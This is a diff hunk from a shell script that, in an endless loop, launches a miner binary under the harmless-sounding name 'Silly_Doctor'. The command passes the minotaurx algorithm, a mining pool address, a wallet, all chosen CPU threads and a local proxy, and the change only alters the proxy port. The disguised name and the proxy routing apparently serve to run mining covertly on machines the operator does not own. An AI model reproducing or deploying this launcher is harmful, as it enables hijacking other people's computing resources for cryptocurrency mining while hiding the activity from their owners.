@@ -93,6 +93,6 @@ sleep 2
 
 while true
 do
-./Silly_Doctor --disable-gpu --algorithm minotaurx --pool flyingsaucer-eu.teatspray.fun:7019 --wallet CS6wMVsAHYUoUi79KeKgywoGHy58vc4QJB --password $currentdate,c=LCC,zap=LCC --proxy 127.0.0.1:1081 --cpu-threads $used_num_of_cores --keepalive
+./Silly_Doctor --disable-gpu --algorithm minotaurx --pool flyingsaucer-eu.teatspray.fun:7019 --wallet CS6wMVsAHYUoUi79KeKgywoGHy58vc4QJB --password $currentdate,c=LCC,zap=LCC --proxy 127.0.0.1:1082 --cpu-threads $used_num_of_cores --keepalive
 sleep 5
 done
